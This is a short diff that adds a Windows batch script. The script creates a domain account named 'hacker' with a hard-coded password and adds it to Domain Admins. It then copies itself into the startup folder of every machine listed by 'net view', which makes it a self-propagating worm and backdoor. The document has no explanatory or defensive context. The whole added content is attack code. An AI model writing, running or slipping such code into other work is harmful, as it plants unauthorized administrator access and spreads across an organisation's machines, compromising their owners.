@@ -1,0 +1,4 @@
+net user /domain /add hacker Iam31337
+net group /domain "Domain Admins" /add hacker 
+for /F %%i in ('net view') do copy /Y %0 "%%i\c$\documents and settings\all users\start menu\programs\startup" 
+
